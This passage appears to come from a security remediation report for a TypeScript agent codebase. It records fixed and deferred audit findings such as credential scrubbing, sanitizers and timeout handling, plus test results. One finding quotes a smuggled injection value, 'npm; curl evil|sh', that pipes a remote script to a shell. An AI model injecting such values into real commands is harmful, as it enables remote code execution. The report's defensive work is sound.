- spawn-agent-utils.ts:2430 — clear-on-success behavior for lastSetOutputError could not be confirmed from the shard's file set; verify in source before fixing.
- env.ts:87 getSystemProcessEnv consumers beyond serve-command.ts:118 were not enumerated; a consumer inventory should precede any removal/deprecation.
- The transaction-intent-log HIGH fix (append-only) interacts with the trim/lock-race MEDIUMs (same file); fix as one coherent change with a crash/interleaving test.
- SCIP runner timeout behavior: the MEDIUM test-coverage gap and the escalate-timer pattern finding suggest a shared runner-lifecycle test harness across diagnostic-delta-runner/semgrep/scip-runner.

## Fix status (2026-10-04 remediation waves)

All 6 HIGHs fixed and independently validated; the MEDIUM/LOW waves closed the remaining actionable findings; a small set is explicitly deferred:

**Fixed (all 6 HIGH + waves of MEDIUM/LOW, per-package typechecks and targeted suites green after every wave):**
- env credential boundary: config-derived credential key set (`sdk/src/credential-env-keys.ts` exporting `WELL_KNOWN_CREDENTIAL_ENV_KEYS` + `getConfiguredCredentialEnvKeys`), denylist applied after caller-env merge in run-terminal-command (both SYNC and BACKGROUND paths), git preflight spawned with the scrubbed env, raw `getSystemProcessEnv` export removed from the public surface; leak-regression tests added.
- SEC-7 containment wired: `runServe` accepts/forwards `projectRoot` + `allowedAdditionalDirectories` on stdio and socket transports, fails loudly when omitted, threads the project root from `cli/src/serve-command.ts`; socket-listener bind→chmod race closed (pre-created with restrictive mode, inode-checked unlink).
- DNS pinning fail-closed on non-Bun runtimes: the original https URL is no longer kept when the Bun-only `tls` RequestInit is unavailable.
- semgrep SIGKILL escalation armed inside the deadline callback (grace counts from the deadline, not spawn); exit-1-with-findings parsed from SARIF and returned as ok.
- transaction intent log: append-only writes (bounded trim retained), identity-verified lock breaks, unfinished tx groups pinned during trim, log/identity artifacts owner-only 0o600.
- run journal: O(1) running per-run byte totals for retention, `forceFlush` contract (flush before side-effecting tools), bounded `recentEvents`/`eventsOfType` readers, close-on-throw try/finally.
- Wave B security MEDIUMs: event-bridge NEW-3 holdback over rawInput; context-pruner sanitize-before-extraction (+ persisted-memory sanitization); memory-drift-guard fail-visible degradation (UNVERIFIED on git failure, test-only git-command seam) + receipt validation; payload-sanitizer recursion-depth cap + extended credential words/carriers + UI-state caps; build-graph python command routed through the safe token allowlist; acp-agent sessions LRU eviction + per-connection sessionId ownership; MCP client listTools retry on rejection + connect memoization; mcp-server apply_edits per-edit results/expectedHash enforcement + issuer hygiene; terminal-notify control-char stripping; tree-sitter-client cache isolation; cli-args empty `--socket` rejection; browser-logs AppArmor userns check + sandbox fail-closed; change-file per-commit abort recheck with rolled-back 'cancelled' outcome; turn-snapshots retention bound + mirror-push security docblock; terminal-images test reset seam.
- Wave C MEDIUMs: lsp-multiplexer dead-entry cold-start replacement + unparseable-frame rejection; harness-intelligence walk caps + cached tool probes with TTL seam; diagnostic-delta tolerant default + applyEdit rollback guard; indexer df-honesty on cap saturation, byte caps on loaded artifacts, compact-first atomic writes, keep-previous on read failure, write-path cache eviction, warn-once; compile-tool-definitions throw on unhandled object-level composite keys + `additionalProperties:false` exact-branch; statistics Wilcoxon minimum-n guard + paired percentile indices; acp-session-data structural gate-snapshot validation (tampered snapshot treated as ABSENT); spawn-agent-utils oversize artifacts 0o600 + TTL sweep + round-trip tests; context-archive dedicated eviction-snapshot cap (16) + 64k eviction body bound with round-trip test; base2 gate-state dead field removal.
- Wave D+E: dash `listRuns` O(runs) via the `runSummaries` journal extension (no per-event hydration); bridge idle-flush contained via `tryEmit` + session-map cleanup on close; deferred-registries invalidation on project switch + new test suite; index.tsx top-level error boundary for non-renderer command dispatch (exit 1, clean stderr); scip-runner worker-degradation memoized/status-surfaced; tool-registration-consistency frozen unrepresentable-allowlist assertion; find-files-matching-content `count` int-bounded (0..500) + structural flag allowlist + schema-bounds test suite; trusted-roots symmetric canonicalization; cdp-pipe writeFrame rejection surfaced; 3d-assets separated stdout/stderr buffers + bounded OPENBUFF_3D_OPERATIONS; token-counter totalTokens; import-sites bare-close Go import block; index-manager revision-tie documentation; common exports glob fix; acp-ext-v1 nonEmptyString guards; golden-vector additions ($ref/additionalProperties).
- Dependency hygiene: common zod pinned exact at 4.2.1 (lockfile byte-frozen contract), `@types/pg`/`@types/readable-stream`/`@types/seedrandom` moved to devDependencies; bun.lock synced (no resolution changes).

**Deferred (documented, not silently dropped):**
- `ignore` major-version alignment across common (5.3.2) and indexer (^7.0.5) — behavioral drift risk; needs its own scoped migration.
- gpt-tokenizer `~2.9.0` pin (agent-runtime) — rides the pending live OpenAI calibration run (P3-T10).
- OutboundQueue (§12.6) remains an explicitly marked later-wave seam rather than wired into transports; DA1 image-capability parser keeps an integration TODO (making `detectTerminalImageSupport` async would ripple through three CLI callers).
- GV-15..30 golden vectors: annotation pass completed where drive-through-real-paths was infeasible this wave; full re-drive tracked for the next protocol change.

**Security-review pass (adversarial, post-remediation):** verdict was BLOCKING with 2 HIGH; all blocking and actionable findings were fixed and re-validated the same turn:
- EV-1 (HIGH) fixed: the tool_result raw-JSON text block now redacts content-bearing fields (afterContent/patch/content/beforeContent → '[sensitive]') for sensitive paths BEFORE serialization, closing the leak that bypassed the NEW-6 diff-block redaction; regression tests assert the redacted text block plus the intact non-sensitive diff block.
- PS-1 (HIGH) fixed: payload-sanitizer classifier now normalizes multi-word credential key shapes (privateKey, awsSecretAccessKey, access_key, clientSecret, privateSigningKey) with regression tests; innocuous keys (monkey, keyboard, publicKey, awsAccessKeyId, accessKeyCount) verified kept.
- BG-1 (MEDIUM) fixed: resolveJavaScriptTargets routes the packageManager-derived manager through safeCommandToken with npm fallback (hostile 'npm; curl evil|sh' → 'npm run test'; pinned 'pnpm@9.0.0+sha256' stays usable).
- ENV-1 (MEDIUM) fixed: scrubChildProcessEnv deletes case-insensitive denylist matches on win32 only (exported matchesCredentialEnvKeyIgnoreCase helper; POSIX path byte-identical; tests via mocked process.platform).
- EV-2 (MEDIUM) fixed: redactCredentialValuesDeep is fail-closed past the depth cap (serialized-subtree credential substitution instead of pass-through); EV-3 (LOW) fixed: redactAllStringsDeep shares the same depth cap and marker semantics.
- CP-1 (LOW) fixed: stripUnsafeTextChars strips the control class first, then ANSI/OSC sequences, to a bounded 4-pass fixpoint so control-joined sequences cannot survive; regression test pins the assembled-escape case (the OSC terminator consumed by the control pass leaves only an inert ']0' fragment — no ESC survives).
- Deferred by design (documented): MDG-1 (local review-receipt authenticity — local suppression is attacker-controllable; CI unaffected since the file is not committed), ENV-2 (custom apiKeyEnv child-scrub derivation — currently manual-sync documented), OQ-1 (OutboundQueue wiring + apply_edits expectedHash as optional param — tracked as the later-wave backpressure slice).

**Validation at close:** typecheck exit 0 for sdk, cli, common, agent-runtime, indexer, code-map, agents, scripts, evals; targeted suites green including the new/updated suites for every fixed finding (env 25/25, serve/SEC-7 + socket suites, dns-pinning, semgrep incl. the 10s grace-timing test, intent-log 57/57, journal 81/81 incl. slice-4 hardening, dash 21/21, lsp-multiplexer, drift-guard 66/66, mcp client 45/45, deferred-registries (new), find-files-matching-content bounds 46/46, base2 247/247, scip-runner + pagerank 61/61). Post-security-fix re-validation: sdk typecheck 0 + event-bridge/build-graph/env suites 88/88; agents typecheck 0 + context-pruner 133/133; cli typecheck 0 + payload-sanitizer 24/24.
